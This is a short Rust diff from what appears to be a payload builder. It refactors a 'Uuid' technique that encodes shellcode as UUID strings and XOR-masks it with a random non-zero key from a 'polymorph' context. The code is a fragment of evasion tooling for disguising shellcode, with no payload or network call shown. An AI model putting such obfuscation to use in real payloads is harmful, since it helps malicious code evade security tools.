@@ -1,5 +1,4 @@
 use crate::techniques::{BuildContext, Technique, TechniqueMeta};
-use crate::tools::random_u8;
 use std::fs;
 
 pub struct Uuid;
@@ -13,7 +12,10 @@ impl Technique for Uuid {
         let original_len = shellcode.len();
         let encoded = uuid_encode(&shellcode);
 
-        let xor_key = non_zero_random_key();
+        let xor_key: u8 = loop {
+            let k = (ctx.polymorph.random_u64() & 0xFF) as u8;
+            if k != 0 { break k; }
+        };
         let masked: Vec<u8> = encoded.bytes().map(|b| b ^ xor_key).collect();
 
         let out_path = ctx.src_dir.join("input.uuid");
@@ -45,10 +47,6 @@ fn uuid_decode(buf: &[u8]) -> Vec<u8> {
         ctx.set_replacement("{{IMPORTS}}", String::new());
         Ok(())
     }
-}
-
-fn non_zero_random_key() -> u8 {
-    loop { let k = random_u8(); if k != 0 { return k; } }
 }
 
 fn bytes_to_uuid(chunk: &[u8; 16]) -> String {
